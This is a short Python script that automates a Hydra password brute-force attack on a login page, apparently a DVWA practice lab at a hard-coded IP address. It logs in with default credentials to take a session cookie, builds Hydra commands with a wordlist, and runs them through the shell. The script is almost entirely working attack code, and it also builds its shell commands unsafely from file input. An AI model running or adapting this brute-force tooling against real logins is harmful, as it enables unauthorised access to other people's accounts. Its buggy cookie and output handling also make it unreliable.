from subprocess import Popen, PIPE
import requests
from bs4 import BeautifulSoup

f = open('addresses.txt', 'r')
file_contents = f.readlines()

def getCookie():
    with requests.Session() as session:
        html = session.get('http://45.147.96.25:4242/login.php')
        html_parsed = BeautifulSoup(html.text, "html.parser")
        user_token = html_parsed.find('input', { "type" : "hidden" })['value']
        creds = {
            "username"   : 'admin',
            "password"   : 'password',
            "Login"      : "Submit",
            "user_token" : user_token
        }
        request = session.post('http://45.147.96.25:4242/login.php', data = creds)
        cookie = html.cookies.get_dict()
        session.close()
    return cookie

inectableForms = []
report = "Starting brute force attack using Hydra:\n"

print("Starting brute force attack using Hydra::")
print("Starting to search a brute force page ...")

for count, line in enumerate(file_contents, start=1):
    address = line[13:].split(' ')[0].strip()

    if "brute" in address:
        report += address + " is the address to attack\n"
        root = address[7:address[7:].find('/')+7]
        page = address[len(root)+7:]
        print(root)
        print(page)
        if ":" in root:
            command = "hydra " + root[:root.find(":")] + " -s " + root[root.find(":") + 1:] + " -I -l admin -P /usr/share/wordlists/dirb/common.txt http-get-form '" \
                + page + "/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:PHPSESSID=" + getCookie()['PHPSESSID'] + ";security=low'"
            check = "host: " + root[:root.find(":")]
        else:
            command = "hydra " + root + " -I -l admin -P /usr/share/wordlists/dirb/common.txt http-get-form '" \
                + page + "/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:PHPSESSID=" + getCookie()['PHPSESSID'] + ";security=low'"
            check = "host: " + root
        print(command)
        process = Popen(command, shell=True, stdout=PIPE)
        for line in process.stdout:
            if check in str(line):
                print(line)
            break
print(report)
